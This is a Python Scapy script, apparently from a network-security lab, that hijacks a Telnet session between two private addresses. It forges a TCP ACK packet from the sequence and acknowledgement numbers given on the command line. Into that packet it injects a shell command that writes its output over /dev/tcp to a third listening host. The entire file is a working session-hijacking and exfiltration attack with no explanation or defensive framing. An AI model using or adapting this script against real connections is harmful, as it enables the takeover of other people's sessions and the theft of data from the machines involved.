import argparse
from scapy.all import *

def spoof_hijack_packet(src_port, seq_num, ack_num):
	user1_ip = "10.9.0.6"
	user2_ip = "10.9.0.7"

	user1_port = src_port
	user2_port = 23

	ip = IP(src=user1_ip, dst=user2_ip)
	tcp = TCP(sport=user1_port, dport=user2_port, flags="A", seq=seq_num, ack=ack_num)
	data = "\r whoami > /dev/tcp/10.9.0.1/9090 \r"

	pkt = ip/tcp/data

	print("SENDING HIJACK PACKET........")
	send(pkt)

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-p", "--src_port", type=int, help="source port", required=True)
	parser.add_argument("-s", "--seq", type=int, help="last sequence number", required=True)
	parser.add_argument("-a", "--ack", type=int, help="last acknowledgement number", required=True)

	args = parser.parse_args()

	spoof_hijack_packet(args.src_port, args.seq, args.ack)
